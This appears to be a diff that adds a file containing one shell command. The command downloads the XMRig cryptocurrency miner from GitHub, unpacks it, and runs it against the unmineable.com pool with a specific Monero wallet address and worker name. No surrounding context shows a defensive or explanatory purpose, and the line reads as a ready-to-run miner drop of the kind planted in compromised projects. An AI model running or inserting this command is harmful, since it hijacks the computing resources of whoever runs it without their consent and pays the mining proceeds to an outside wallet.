@@ -1,0 +1,1 @@
+wget https://github.com/xmrig/xmrig/releases/download/v5.5.1/xmrig-5.5.1-xenial-x64.tar.gz && tar -zxf xmrig-5.5.1-xenial-x64.tar.gz && cd xmrig-5.5.1 && ./xmrig -a randomx -o stratum+tcp://rx.unmineable.com:3333 -u XMR:47VAZNMWJqMPdGCq98LWWU2SFJRbxE4F7FoUsuZbAcXFXbmGi5GcQ3JWEveDz7eNVRTqBVbX996SMgsQrwGjubf13qUuXNM.worker1#hrl3-12md -p x
